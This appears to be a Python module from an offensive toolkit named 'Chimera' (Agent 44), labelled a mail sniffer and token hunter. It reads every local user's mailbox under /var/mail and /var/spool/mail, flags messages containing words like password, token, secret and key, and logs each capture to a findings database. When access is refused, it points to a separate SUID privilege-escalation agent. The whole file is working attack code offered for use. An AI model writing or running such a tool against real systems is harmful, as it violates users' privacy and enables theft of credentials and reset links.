import os
import sys

sys.path.append('/home/dan/Chimera_Project')
from core.db_handler import ChimeraDB

def run():
    db = ChimeraDB()
    os.system('clear')
    print("\033[94m" + "="*60)
    print("   CHIMERA AGENT 44 :: LOCAL MAIL SNIFFER & TOKEN HUNTER")
    print("="*60 + "\033[0m")

    # Common locations for local Linux mail
    mail_paths = ["/var/mail/", "/var/spool/mail/"]
    
    found_mail = False
    print("[*] Scanning system mailboxes for sensitive data...")

    for path in mail_paths:
        if os.path.exists(path):
            users = os.listdir(path)
            for user in users:
                full_path = os.path.join(path, user)
                try:
                    with open(full_path, 'r', errors='ignore') as f:
                        content = f.read()
                        if content:
                            print(f"\033[92m[+] Captured mail for user: {user}\033[0m")
                            found_mail = True
                            
                            # Look for "Keywords of Interest"
                            keywords = ["password", "token", "reset", "secret", "key"]
                            for kw in keywords:
                                if kw in content.lower():
                                    print(f"    [!] Alert: Found '{kw}' in {user}'s mail!")
                            
                            db.report_finding("44_Mail_Sniffer", "Local_Mail_Captured", {
                                "user": user,
                                "path": full_path,
                                "length": len(content)
                            })
                except PermissionError:
                    print(f"\033[91m[!] Access Denied to {user}'s mail. Need Root (Agent 43/SUID).\033[0m")
                except Exception as e:
                    print(f"[!] Error reading {user}: {e}")

    if not found_mail:
        print("[*] No local mail found on this system.")

    db.close()

if __name__ == "__main__":
    run()
